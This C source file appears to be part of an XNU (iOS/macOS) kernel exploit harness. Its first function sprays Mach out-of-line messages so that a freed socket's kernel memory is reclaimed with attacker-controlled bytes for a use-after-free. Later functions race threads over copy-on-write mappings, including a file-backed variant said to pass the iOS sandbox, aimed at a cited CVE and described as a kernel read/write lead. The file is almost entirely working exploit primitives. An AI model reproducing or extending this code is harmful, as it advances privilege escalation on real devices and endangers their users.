// Cross-zone reclaim spray for the socket-UAF harness.
// Sends MACH_MSG_OOL_DESCRIPTOR messages with MACH_MSG_VIRTUAL_COPY so the
// kernel copies the payload into fresh kernel memory. Deliberately *not*
// sockets, so a freed socket slot reclaimed this way holds attacker bytes.

#include <mach/mach.h>
#include <mach/message.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#define SOCKUAF_MAX_PORTS 1024

static mach_port_t sockuaf_ports[SOCKUAF_MAX_PORTS];
static int sockuaf_port_count;

void sockuaf_ool_reset(void) { sockuaf_port_count = 0; }

int sockuaf_ool_count(void) { return sockuaf_port_count; }

int sockuaf_ool_spray(size_t size, int count, uint64_t fill)
{
    if (count > SOCKUAF_MAX_PORTS - sockuaf_port_count)
        count = SOCKUAF_MAX_PORTS - sockuaf_port_count;
    if (count <= 0 || size == 0)
        return 0;

    uint8_t *buf = malloc(size);
    if (!buf)
        return 0;
    for (size_t i = 0; i < size; i += 8) {
        uint64_t v = fill;
        size_t n = size - i < 8 ? size - i : 8;
        memcpy(buf + i, &v, n);
    }

    int made = 0;
    for (int i = 0; i < count; i++) {
        mach_port_t port = MACH_PORT_NULL;
        if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port) != KERN_SUCCESS)
            break;
        if (mach_port_insert_right(mach_task_self(), port, port,
                                   MACH_MSG_TYPE_MAKE_SEND) != KERN_SUCCESS) {
            mach_port_deallocate(mach_task_self(), port);
            break;
        }

        struct {
            mach_msg_header_t header;
            mach_msg_body_t body;
            mach_msg_ool_descriptor_t desc;
        } msg;
        memset(&msg, 0, sizeof(msg));
        msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
        msg.header.msgh_size = sizeof(msg);
        msg.header.msgh_remote_port = port;
        msg.header.msgh_local_port = MACH_PORT_NULL;
        msg.header.msgh_id = 0x4f4f5343;
        msg.body.msgh_descriptor_count = 1;
        msg.desc.address = buf;
        msg.desc.size = (mach_msg_size_t)size;
        msg.desc.deallocate = 0;
        msg.desc.copy = MACH_MSG_VIRTUAL_COPY;
        msg.desc.type = MACH_MSG_OOL_DESCRIPTOR;

        kern_return_t kr = mach_msg(&msg.header, MACH_SEND_MSG, sizeof(msg), 0,
                                    MACH_PORT_NULL, 0, MACH_PORT_NULL);
        if (kr != KERN_SUCCESS) {
            mach_port_deallocate(mach_task_self(), port);
            break;
        }
        sockuaf_ports[sockuaf_port_count++] = port;
        made++;
    }
    free(buf);
    return made;
}

/* ---- CoW / external-object fault storm (see analysis/krw-leads/CVE-2026-112576-cow.md) ---- */
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>

typedef struct {
    uint8_t *base;
    uint64_t size;
    volatile int go;
} cow_thread_arg_t;

static void *cow_writer(void *p)
{
    cow_thread_arg_t *a = (cow_thread_arg_t *)p;
    while (!a->go) { }
    uint64_t pages = (a->size + 4095) / 4096;
    for (uint64_t i = 0; i < pages; i++) {
        a->base[i * 4096] ^= (uint8_t)(i & 0xff);
    }
    return NULL;
}


/* File-backed MAP_PRIVATE CoW storm: exercises the same vm_fault_page() CoW branch
   but through an interface the iOS sandbox permits. */
typedef struct {
    uint8_t *priv;
    uint8_t *shr;
    uint64_t size;
    volatile int go;
} cowf_arg_t;

static void *cowf_writer(void *p)
{
    cowf_arg_t *a = (cowf_arg_t *)p;
    while (!a->go) { }
    uint64_t pages = (a->size + 4095) / 4096;
    for (uint64_t i = 0; i < pages; i++) {
        a->priv[i * 4096] ^= (uint8_t)(i & 0xff);
        if (a->shr) {
            a->shr[i * 4096] += 1;
        }
    }
    return NULL;
}

/* stages: [0]=open/ftruncate [1]=mmap_private [2]=mmap_shared [3]=threads */
int cow_file_probe(int rounds, int size_kb, const char *dir, int *stages)
{
    int first_err = 0;
    char path[512];

    for (int r = 0; r < rounds; r++) {
        uint64_t size = (uint64_t)size_kb * (1u + (uint32_t)(r % 4)) * 1024u;
        snprintf(path, sizeof(path), "%s/cowprobe_%d.bin", dir, r);
        int fd = open(path, O_CREAT | O_TRUNC | O_RDWR, 0600);
        if (fd < 0 || ftruncate(fd, (off_t)size) != 0) {
            stages[0]++;
            if (fd >= 0) close(fd);
            continue;
        }

        uint8_t *priv = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
        if (priv == MAP_FAILED) {
            stages[1]++;
            close(fd);
            continue;
        }

        uint8_t *shr = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);

        cowf_arg_t t1 = { priv, shr, size, 0 };
        cowf_arg_t t2 = { priv, NULL, size, 0 };
        pthread_t th1, th2;
        if (pthread_create(&th1, NULL, cowf_writer, &t1) == 0 &&
            pthread_create(&th2, NULL, cowf_writer, &t2) == 0) {
            t1.go = 1; t2.go = 1;
            pthread_join(th1, NULL); pthread_join(th2, NULL);
        } else {
            stages[3]++;
        }

        if (shr && shr != MAP_FAILED) munmap(shr, size);
        munmap(priv, size);
        close(fd);
        unlink(path);
    }
    return first_err;
}

/* stages: [0]=make_entry [1]=map1 [2]=map2 [3]=allocate [4]=copy [5]=thread */
int cow_probe_run(int rounds, int size_kb, int *stages)
{
    int first_kr = 0;
    vm_map_t self = mach_task_self();

    for (int r = 0; r < rounds; r++) {
        uint64_t size = (uint64_t)size_kb * (1u + (uint32_t)(r % 4)) * 1024u;
        mach_port_t entry = MACH_PORT_NULL;

        kern_return_t kr = mach_make_memory_entry_64(
            self, &size, 0,
            VM_PROT_READ | VM_PROT_WRITE,
            &entry, MACH_PORT_NULL);
        if (kr != KERN_SUCCESS) {
            stages[0]++;
            if (!first_kr) first_kr = (int)kr;
            continue;
        }

        vm_address_t a1 = 0;
        kr = vm_map(self, &a1, (vm_size_t)size, 0, VM_FLAGS_ANYWHERE,
                    entry, 0, FALSE,
                    VM_PROT_READ | VM_PROT_WRITE,
                    VM_PROT_READ | VM_PROT_WRITE,
                    VM_INHERIT_NONE);
        if (kr != KERN_SUCCESS) {
            stages[1]++;
            if (!first_kr) first_kr = (int)kr;
            mach_port_deallocate(self, entry);
            continue;
        }
        memset((void *)a1, 0x5a, size);

        vm_address_t a2 = 0;
        kr = vm_map(self, &a2, (vm_size_t)size, 0, VM_FLAGS_ANYWHERE,
                    entry, 0, FALSE,
                    VM_PROT_READ | VM_PROT_WRITE,
                    VM_PROT_READ | VM_PROT_WRITE,
                    VM_INHERIT_NONE);
        if (kr != KERN_SUCCESS) {
            stages[2]++;
            if (!first_kr) first_kr = (int)kr;
            vm_deallocate(self, a1, (vm_size_t)size);
            mach_port_deallocate(self, entry);
            continue;
        }

        vm_address_t a3 = 0;
        if (vm_allocate(self, &a3, (vm_size_t)size, VM_FLAGS_ANYWHERE) == KERN_SUCCESS) {
            kr = vm_copy(self, a1, (vm_size_t)size, a3);
            if (kr != KERN_SUCCESS) {
                stages[4]++;
                if (!first_kr) first_kr = (int)kr;
            }
        } else {
            stages[3]++;
            if (!first_kr) first_kr = (int)kr;
        }

        cow_thread_arg_t t1 = { (uint8_t *)a1, size, 0 };
        cow_thread_arg_t t2 = { (uint8_t *)a2, size, 0 };
        pthread_t th1, th2;
        if (pthread_create(&th1, NULL, cow_writer, &t1) == 0 &&
            pthread_create(&th2, NULL, cow_writer, &t2) == 0) {
            t1.go = 1; t2.go = 1;
            pthread_join(th1, NULL); pthread_join(th2, NULL);
        } else {
            stages[5]++;
        }

        vm_deallocate(self, a1, (vm_size_t)size);
        vm_deallocate(self, a2, (vm_size_t)size);
        if (a3) vm_deallocate(self, a3, (vm_size_t)size);
        mach_port_deallocate(self, entry);
    }
    return first_kr;
}
